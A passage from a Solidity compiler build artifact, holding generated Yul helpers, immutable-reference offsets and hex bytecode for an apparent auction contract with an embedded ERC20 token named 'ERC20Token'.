96)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_address_to_t_address_fromStack(value1,  add(headStart, 32))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value2,  add(headStart, 64))\n\n    }\n\n    function abi_encode_tuple_t_uint256_t_uint256_t_uint256__to_t_uint256_t_uint256_t_uint256__fromStack_reversed(headStart , value2, value1, value0) -> tail {\n        tail := add(headStart, 96)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value1,  add(headStart, 32))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value2,  add(headStart, 64))\n\n    }\n\n}\n","id":10,"language":"Yul","name":"#utility.yul"}],"immutableReferences":{"1013":[{"length":32,"start":3679},{"length":32,"start":4642}],"1015":[{"length":32,"start":1829},{"length":32,"start":4706},{"length":32,"start":4751}],"1017":[{"length":32,"start":1695},{"length":32,"start":1869},{"length":32,"start":2033},{"length":32,"start":3369},{"length":32,"start":4104},{"length":32,"start":4246},{"length":32,"start":4412},{"length":32,"start":4872},{"length":32,"start":5713},{"length":32,"start":5857}]},"linkReferences":{},"object":"608060405260043610620001335760003560e01c80637ded653f11620000af578063ca77ab65116200006d578063ca77ab65146200040a578063df3853061462000424578063e4655bca1462000454578063e47112bd1462000484578063fe67a54b146200049e576200013b565b80637ded653f146200030857806383634e1c1462000338578063a45b4abb146200037c578063aa9d9bd614620003c0578063ac5ece6d14620003da576200013b565b80631f73208811620000fd5780631f73208814620001e75780631f8cdb04146200022b5780632d21a3ed14620002375780633fa8578d146200027b5780634fee13fc14620002c4576200013b565b806308bfc300146200013d5780630b324808146200016d57806312210e8a146200019d57806314df33ac14620001b7576200013b565b366200013b57005b005b3480156200014a57600080fd5b5062000155620004b8565b60405162000164919062001c0b565b60405180910390f35b3480156200017a57600080fd5b5062000185620004cf565b60405162000194919062001c43565b60405180910390f35b348015620001aa57600080fd5b50620001b5620004d8565b005b348015620001c457600080fd5b50620001cf6200069b565b604051620001de919062001c7b565b60405180910390f35b348015620001f457600080fd5b506200021360048036038101906200020d919062001cce565b62000749565b60405162000222919062001c7b565b60405180910390f35b62000235620007ef565b005b3480156200024457600080fd5b506200026360048036038101906200025d919062001cce565b62000bdc565b60405162000272919062001c7b565b60405180910390f35b3480156200028857600080fd5b50620002a76004803603810190620002a1919062001cce565b62000cbc565b604051620002bb9695949392919062001d62565b60405180910390f35b348015620002d157600080fd5b50620002f06004803603810190620002ea919062001dcf565b62000d25565b604051620002ff919062001e16565b60405180910390f35b3480156200031557600080fd5b506200032062001004565b6040516200032f919062001c7b565b60405180910390f35b3480156200034557600080fd5b506200036460048036038101906200035e919062001cce565b62001092565b60405162000373919062001c7b565b60405180910390f35b3480156200038957600080fd5b50620003a86004803603810190620003a2919062001cce565b62001138565b604051620003b7919062001c7b565b60405180910390f35b348015620003cd57600080fd5b50620003d8620011de565b005b348015620003e757600080fd5b50620003f262001304565b60405162000401919062001e16565b60405180910390f35b3480156200041757600080fd5b50620004226200132c565b005b3480156200043157600080fd5b506200043c6200164d565b6040516200044b919062001c7b565b60405180910390f35b3480156200046157600080fd5b506200046c620016dd565b6040516200047b919062001c7b565b60405180910390f35b3480156200049157600080fd5b506200049c6200176d565b005b348015620004ab57600080fd5b50620004b662001a4c565b005b6000600960009054906101000a900460ff16905090565b60008054905090565b60005b600154811015620006985760006008600083815260200190815260200160002060040154118015620005225750600860008281526020019081526020016000206004015447115b80156200052f5750600047115b15620006825760006008600083815260200190815260200160002060040154905060006008600084815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1682604051620005ae9062001e68565b60006040518083038185875af1925050503d8060008114620005ed576040519150601f19603f3d011682016040523d82523d6000602084013e620005f2565b606091505b505090507fb24b09fd2e8e4d8904c3c26f3e935824e032891520ffda419dec9f086b0e1eea6008600085815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600860008681526020019081526020016000206003015484604051620006779392919062001e7f565b60405180910390a150505b80806200068f9062001eeb565b915050620004db565b50565b60007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161462000723576040517fae4a21bc00000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b7f0000000000000000000000000000000000000000000000000000000000000000905090565b60007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614620007d1576040517fae4a21bc00000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b60086000838152602001908152602001600020600201549050919050565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff160362000875576040517fc3fdc7c100000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b600960009054906101000a900460ff1660018111156200089a576200089962001b8b565b5b600180811115620008b057620008af62001b8b565b5b03620008e8576040517f5de7a96600000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b600034116200092e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401620009259062001f99565b60405180910390fd5b620009386200132c565b6104b0600354426200094b919062001fbb565b106200098e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401620009859062002046565b60405180910390fd5b600060045411620009d6576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401620009cd90620020b8565b60405180910390fd5b600060086000600154815260200190815260200160002090506001548160000181905550338160010160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034816002018190555060018160050160006101000a81548160ff021916908315150217905550600081600301819055506000816004018190555080600860006001548152602001908152602001600020600082015481600001556001820160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168160010160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506002820154816002015560038201548160030155600482015481600401556005820160009054906101000a900460ff168160050160006101000a81548160ff0219169083151502179055509050507f6559452b5cf88e12990371c9441273d2dbb464fb7dd9cc4030551b86df924b6281600001548260010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836002015460405162000bad93929190620020da565b60405180910390a16001600081548092919062000bca9062001eeb565b919050555062000bd96200132c565b50565b6000600660019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a082316008600085815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b815260040162000c71919062001e16565b602060405180830381865afa15801562000c8f573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000cb591906200212e565b9050919050565b60086020528060005260406000206000915090508060000154908060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16908060020154908060030154908060040154908060050160009054906101000a900460ff16905086565b60007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161462000dad576040517fae4a21bc00000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b600960009054906101000a900460ff16600181111562000dd25762000dd162001b8b565b5b6000600181111562000de95762000de862001b8b565b5b0362000e21576040517f6668065e00000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b6000600960006101000a81548160ff0219169083600181111562000e4a5762000e4962001b8b565b5b021790555082600281905550816005819055507f000000000000000000000000000000000000000000000000000000000000000060008190555082600481905550426003819055506002543060405162000ea49062001b7d565b62000eb192919062002160565b604051809103906000f08015801562000ece573d6000803e3d6000fd5b50600660016101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600660019054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600760006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055507f0f0eb7cc9cde5623ecdc8f18c7fe6bacab47ab80468f73b4d9b3d08ec7284af5600354600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660025460055460405162000fd194939291906200218d565b60405180910390a1600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905092915050565b60007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146200108c576040517fae4a21bc00000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b47905090565b60007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146200111a576040517fae4a21bc00000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b60086000838152602001908152602001600020600301549050919050565b60007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614620011c0576040517fae4a21bc00000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b60086000838152602001908152602001600020600401549050919050565b600660009054906101000a900460ff166200130257600554603c6003544262001208919062001fbb565b62001214919062002209565b62001220919062002241565b7f00000000000000000000000000000000000000000000000000000000000000006200124d9190620022c5565b600081905550600080541315806200128757507f000000000000000000000000000000000000000000000000000000000000000060005413155b15620012b5577f00000000000000000000000000000000000000000000000000000000000000006000819055505b7f7cda8554820ef0a356899263aefa9db86ab6966b7b823eda047b78c3afdfeb8e60035442620012e6919062001fbb565b600054604051620012f99291906200230f565b60405180910390a15b565b60007f0000000000000000000000000000000000000000000000000000000000000000905090565b62001336620011de565b6000600254905060005b600154811015620015e057600054600860008381526020019081526020016000206002015462001371919062002209565b82106200140f5760005460086000838152602001908152602001600020600201546200139e919062002209565b60086000838152602001908152602001600020600301819055506000546008600083815260200190815260200160002060020154620013de919062002209565b82620013eb919062001fbb565b9150600060086000838152602001908152602001600020600401819055506200152b565b600082118015620014445750600054600860008381526020019081526020016000206002015462001441919062002209565b82105b15620014d2578160086000838152602001908152602001600020600301819055506000915060005460086000838152602001908152602001600020600301546200148f91906200233c565b6008600083815260200190815260200160002060020154620014b2919062001fbb565b60086000838152602001908152602001600020600401819055506200152a565b60008211620015295760006008600083815260200190815260200160002060030181905550600860008281526020019081526020016000206002015460086000838152602001908152602001600020600401819055505b5b5b7fb24b09fd2e8e4d8904c3c26f3e935824e032891520ffda419dec9f086b0e1eea6008600083815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660086000848152602001908152602001600020600301546008600085815260200190815260200160002060040154604051620015c29392919062001e7f565b60405180910390a18080620015d79062001eeb565b91505062001340565b506000811115620015f857806004819055506200164a565b6001600960006101000a81548160ff0219169083600181111562001621576200162062001b8b565b5b021790555060006004819055506001600660006101000a81548160ff0219169083151502179055505b50565b60007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614620016d5576040517fae4a21bc00000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b600254905090565b60007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161462001765576040517fae4a21bc00000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b600154905090565b60005b60015481101562001a495760006008600083815260200190815260200160002060030154111562001a3357600660019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b36008600084815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16670de0b6b3a764000060086000868152602001908152602001600020600301546200183c91906200233c565b6040518363ffffffff1660e01b81526004016200185b92919062002387565b6020604051808303816000875af11580156200187b573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620018a19190620023e5565b50600660019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd306008600085815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16670de0b6b3a764000060086000878152602001908152602001600020600301546200194491906200233c565b6040518463ffffffff1660e01b8152600401620019649392919062002417565b6020604051808303816000875af115801562001984573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620019aa9190620023e5565b507f039b13884cbcea684931b2bcff6faab7170693e1bc173e651e14168c890c70806008600083815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600860008481526020019081526020016000206003015460405162001a2a92919062002387565b60405180910390a15b808062001a409062001eeb565b91505062001770565b50565b6001600960006101000a81548160ff0219169083600181111562001a755762001a7462001b8b565b5b021790555062001a846200132c565b62001a8e620004d8565b62001a986200176d565b6000600454111562001b3a57600660019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639dc29fac306004546040518363ffffffff1660e01b815260040162001b0592919062002387565b600060405180830381600087803b15801562001b2057600080fd5b505af115801562001b35573d6000803e3d6000fd5b505050505b7f99d9aed25b1415a4a35a1890d2ee6aa1db28f98ba8eff1de3d494a6af9dca7726001546004544760405162001b739392919062002454565b60405180910390a1565b611ef0806200249283390190565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602160045260246000fd5b6002811062001bce5762001bcd62001b8b565b5b50565b600081905062001be18262001bba565b919050565b600062001bf38262001bd1565b9050919050565b62001c058162001be6565b82525050565b600060208201905062001c22600083018462001bfa565b92915050565b6000819050919050565b62001c3d8162001c28565b82525050565b600060208201905062001c5a600083018462001c32565b92915050565b6000819050919050565b62001c758162001c60565b82525050565b600060208201905062001c92600083018462001c6a565b92915050565b600080fd5b62001ca88162001c60565b811462001cb457600080fd5b50565b60008135905062001cc88162001c9d565b92915050565b60006020828403121562001ce75762001ce662001c98565b5b600062001cf78482850162001cb7565b91505092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600062001d2d8262001d00565b9050919050565b62001d3f8162001d20565b82525050565b60008115159050919050565b62001d5c8162001d45565b82525050565b600060c08201905062001d79600083018962001c6a565b62001d88602083018862001d34565b62001d97604083018762001c6a565b62001da6606083018662001c6a565b62001db5608083018562001c6a565b62001dc460a083018462001d51565b979650505050505050565b6000806040838503121562001de95762001de862001c98565b5b600062001df98582860162001cb7565b925050602062001e0c8582860162001cb7565b9150509250929050565b600060208201905062001e2d600083018462001d34565b92915050565b600081905092915050565b50565b600062001e5060008362001e33565b915062001e5d8262001e3e565b600082019050919050565b600062001e758262001e41565b9150819050919050565b600060608201905062001e96600083018662001d34565b62001ea5602083018562001c6a565b62001eb4604083018462001c6a565b949350505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600062001ef88262001c60565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820362001f2d5762001f2c62001ebc565b5b600182019050919050565b600082825260208201905092915050565b7f62696456616c7565206c657373207468616e2030000000000000000000000000600082015250565b600062001f8160148362001f38565b915062001f8e8262001f49565b602082019050919050565b6000602082019050818103600083015262001fb48162001f72565b9050919050565b600062001fc88262001c60565b915062001fd58362001c60565b925082820390508181111562001ff05762001fef62001ebc565b5b92915050565b7f74696d6520697320757000000000000000000000000000000000000000000000600082015250565b60006200202e600a8362001f38565b91506200203b8262001ff6565b602082019050919050565b6000602082019050818103600083015262002061816200201f565b9050919050565b7f5468657265206973206e6f206d6f726520616c676f73206c6566740000000000600082015250565b6000620020a0601b8362001f38565b9150620020ad8262002068565b602082019050919050565b60006020820190508181036000830152620020d38162002091565b9050919050565b6000606082019050620020f1600083018662001c6a565b62002100602083018562001d34565b6200210f604083018462001c6a565b949350505050565b600081519050620021288162001c9d565b92915050565b60006020828403121562002147576200214662001c98565b5b6000620021578482850162002117565b91505092915050565b600060408201905062002177600083018562001c6a565b62002186602083018462001d34565b9392505050565b6000608082019050620021a4600083018762001c6a565b620021b3602083018662001d34565b620021c2604083018562001c6a565b620021d1606083018462001c6a565b95945050505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6000620022168262001c60565b9150620022238362001c60565b925082620022365762002235620021da565b5b828204905092915050565b60006200224e8262001c28565b91506200225b8362001c28565b92508282026200226b8162001c28565b91507f80000000000000000000000000000000000000000000000000000000000000008414600084121615620022a657620022a562001ebc565b5b8282058414831517620022be57620022bd62001ebc565b5b5092915050565b6000620022d28262001c28565b9150620022df8362001c28565b925082820390508181126000841216828213600085121516171562002309576200230862001ebc565b5b92915050565b600060408201905062002326600083018562001c6a565b62002335602083018462001c6a565b9392505050565b6000620023498262001c60565b9150620023568362001c60565b9250828202620023668162001c60565b9150828204841483151762002380576200237f62001ebc565b5b5092915050565b60006040820190506200239e600083018562001d34565b620023ad602083018462001c6a565b9392505050565b620023bf8162001d45565b8114620023cb57600080fd5b50565b600081519050620023df81620023b4565b92915050565b600060208284031215620023fe57620023fd62001c98565b5b60006200240e84828501620023ce565b91505092915050565b60006060820190506200242e600083018662001d34565b6200243d602083018562001d34565b6200244c604083018462001c6a565b949350505050565b60006060820190506200246b600083018662001c6a565b6200247a602083018562001c6a565b62002489604083018462001c6a565b94935050505056fe60806040523480156200001157600080fd5b5060405162001ef038038062001ef0833981810160405281019062000037919062000805565b336040518060400160405280600a81526020017f4552433230546f6b656e000000000000000000000000000000000000000000008152506040518060400160405280600281526020017f45540000000000000000000000000000000000000000000000000000000000008152508160039081620000b5919062000abc565b508060049081620000c7919062000abc565b505050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036200013f5760006040517f1e4fbdf700000000000000000000000000000000000000000000000000000000815260040162000136919062000bb4565b60405180910390fd5b6200015081620001a860201b60201c565b506200017833670de0b6b3a7640000846200016c919062000c00565b6200026e60201b60201c565b6200019f81670de0b6b3a76400008462000193919062000c00565b620002fb60201b60201c565b50505062000cf1565b6000600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905081600560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603620002e35760006040517fec442f05000000000000000000000000000000000000000000000000000000008152600401620002da919062000bb4565b60405180910390fd5b620002f7600083836200032e60201b60201c565b5050565b6000806200030e6200055e60201b60201c565b9050620003238185856200056660201b60201c565b600191505092915050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16036200038457806002600082825462000377919062000c4b565b925050819055506200045a565b60008060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490508181101562000413578381836040517fe450d38c0000000000000000000000000000000000000000000000000000000081526004016200040a9392919062000c97565b60405180910390fd5b8181036000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550505b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603620004a55780600260008282540392505081905550620004f2565b806000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055505b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8360405162000551919062000cd4565b60405180910390a3505050565b600033905090565b6200057b83838360016200058060201b60201c565b505050565b600073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1603620005f55760006040517fe602df05000000000000000000000000000000000000000000000000000000008152600401620005ec919062000bb4565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16036200066a5760006040517f94280d6200000000000000000000000000000000000000000000000000000000815260040162000661919062000bb4565b60405180910390fd5b81600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555080156200075a578273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9258460405162000751919062000cd4565b60405180910390a35b50505050565b600080fd5b6000819050919050565b6200077a8162000765565b81146200078657600080fd5b50565b6000815190506200079a816200076f565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000620007cd82620007a0565b9050919050565b620007df81620007c0565b8114620007eb57600080fd5b50565b600081519050620007ff81620007d4565b92915050565b600080604083850312156200081f576200081e62000760565b5b60006200082f8582860162000789565b92505060206200084285828601620007ee565b9150509250929050565b600081519050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b60006002820490506001821680620008ce57607f821691505b602082108103620008e457620008e362000886565b5b50919050565b60008190508160005260206000209050919050565b60006020601f8301049050919050565b600082821b905092915050565b6000600883026200094e7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff826200090f565b6200095a86836200090f565b95508019841693508086168417925050509392505050565b6000819050919050565b60006200099d62000997620009918462000765565b62000972565b62000765565b9050919050565b6000819050919050565b620009b9836200097c565b620009d1620009c882620009a4565b8484546200091c565b825550505050565b600090565b620009e8620009d9565b620009f5818484620009ae565b505050565b5b8181101562000a1d5762000a11600082620009de565b600181019050620009fb565b5050565b601f82111562000a6c5762000a3681620008ea565b62000a4184620008ff565b8101602085101562000a51578190505b62000a6962000a6085620008ff565b830182620009fa565b50505b505050565b600082821c905092915050565b600062000a916000198460080262000a71565b1980831691505092915050565b600062000aac838362000a7e565b9150826002028217905092915050565b62000ac7826200084c565b67ffffffffffffffff81111562000ae35762000ae262000857565b5b62000aef8254620008b5565b62000afc82828562000a21565b600060209050601f83116001811462000b34576000841562000b1f578287015190505b62000b2b858262000a9e565b86555062000b9b565b601f19841662000b4486620008ea565b60005b8281101562000b6e5784890151825560018201915060208501945060208101905062000b47565b8683101562000b8e578489015162000b8a601f89168262000a7e565b8355505b6001600288020188555050505b505050505050565b62000bae81620007c0565b82525050565b600060208201905062000bcb600083018462000ba3565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600062000c0d8262000765565b915062000c1a8362000765565b925082820262000c2a8162000765565b9150828204841483151762000c445762000c4362000bd1565b5b5092915050565b600062000c588262000765565b915062000c658362000765565b925082820190508082111562000c805762000c7f62000bd1565b5b92915050565b62000c918162000765565b82525050565b600060608201905062000cae600083018662000ba3565b62000cbd602083018562000c86565b62000ccc604083018462000c86565b949350505050565b600060208201905062000ceb600083018462000c86565b92915050565b6111ef8062000d016000396000f3fe608060405234801561001057600080fd5b50600436106100cf5760003560e01c8063715018a61161008c5780639dc29fac116100665780639dc29fac14610204578063a9059cbb14610220578063dd62ed3e14610250578063f2fde38b14610280576100cf565b8063715018a6146101be5780638da5cb5b146101c857806395d89b41146101e6576100cf565b806306fdde03146100d4578063095ea7b3146100f257806318160ddd1461012257806323b872dd14610140578063313ce5671461017057806370a082311461018e575b600080fd5b6100dc61029c565b6040516100e99190610e01565b60405180910390f35b61010c60048036038101906101079190610ebc565b61032e565b6040516101199190610f17565b60405180910390f35b61012a610351565b6040516101379190610f41565b60405180910390f35b61015a60048036038101906101559190610f5c565b61035b565b6040516101679190610f17565b60405180910390f35b61017861038a565b6040516101859190610fcb565b60405180910390f35b6101a860048036038101906101a39190610fe6565b610393565b6040516101b59190610f41565b60405180910390f35b6101c66103db565b005b6101d06103ef565b6040516101dd9190611022565b60405180910390f35b6101ee610419565b6040516101fb9190610e01565b60405180910390f35b61021e60048036038101906102199190610ebc565b6104ab565b005b61023a60048036038101906102359190610ebc565b6104d4565b6040516102479190610f17565b60405180910390f35b61026a6004803603810190610265919061103d565b6104f7565b6040516102779190610f41565b60405180910390f35b61029a60048036038101906102959190610fe6565b61057e565b005b6060600380546102ab906110ac565b80601f01602080910402602001604051908101604052809291908181526020018280546102d7906110ac565b80156103245780601f106102f957610100808354040283529160200191610324565b820191906000526020600020905b81548152906001019060200180831161030757829003601f168201915b5050505050905090565b600080610339610604565b905061034681858561060c565b600191505092915050565b6000600254905090565b600080610366610604565b905061037385828561061e565b61037e8585856106b2565b60019150509392505050565b60006012905090565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6103e36107a6565b6103ed600061082d565b565b6000600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b606060048054610428906110ac565b80601f0160208091040260200160405190810160405280929190818152602001828054610454906110ac565b80156104a15780601f10610476576101008083540402835291602001916104a1565b820191906000526020600020905b81548152906001019060200180831161048457829003601f168201915b5050505050905090565b6104b36107a6565b6104d082670de0b6b3a7640000836104cb919061110c565b6108f3565b5050565b6000806104df610604565b90506104ec8185856106b2565b600191505092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b6105866107a6565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036105f85760006040517f1e4fbdf70000000000000000000000000000000000000000000000000000000081526004016105ef9190611022565b60405180910390fd5b6106018161082d565b50565b600033905090565b6106198383836001610975565b505050565b600061062a84846104f7565b90507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff81146106ac578181101561069c578281836040517ffb8f41b20000000000000000000000000000000000000000000000000000000081526004016106939392919061114e565b60405180910390fd5b6106ab84848484036000610975565b5b50505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16036107245760006040517f96c6fd1e00000000000000000000000000000000000000000000000000000000815260040161071b9190611022565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036107965760006040517fec442f0500000000000000000000000000000000000000000000000000000000815260040161078d9190611022565b60405180910390fd5b6107a1838383610b4c565b505050565b6107ae610604565b73ffffffffffffffffffffffffffffffffffffffff166107cc6103ef565b73ffffffffffffffffffffffffffffffffffffffff161461082b576107ef610604565b6040517f118cdaa70000000000000000000000000000000000000000000000000000000081526004016108229190611022565b60405180910390fd5b565b6000600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905081600560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036109655760006040517f96c6fd1e00000000000000000000000000000000000000000000000000000000815260040161095c9190611022565b60405180910390fd5b61097182600083610b4c565b5050565b600073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16036109e75760006040517fe602df050000000000000000000000000000000000000000000000000000000081526004016109de9190611022565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603610a595760006040517f94280d62000000000000000000000000000000000000000000000000000000008152600401610a509190611022565b60405180910390fd5b81600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508015610b46578273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92584604051610b3d9190610f41565b60405180910390a35b50505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603610b9e578060026000828254610b929190611185565b92505081905550610c71565b60008060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905081811015610c2a578381836040517fe450d38c000000000000000000000000000000000000000000000000000000008152600401610c219392919061114e565b60405180910390fd5b8181036000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550505b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603610cba5780600260008282540392505081905550610d07565b806000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055505b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef83604051610d649190610f41565b60405180910390a3505050565b600081519050919050565b600082825260208201905092915050565b60005b83811015610dab578082015181840152602081019050610d90565b60008484015250505050565b6000601f19601f8301169050919050565b6000610dd382610d71565b610ddd8185610d7c565b9350610ded818560208601610d8d565b610df681610db7565b840191505092915050565b60006020820190508181036000830152610e1b8184610dc8565b905092915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610e5382610e28565b9050919050565b610e6381610e48565b8114610e6e57600080fd5b50565b600081359050610e8081610e5a565b92915050565b6000819050919050565b610e9981610e86565b8114610ea457600080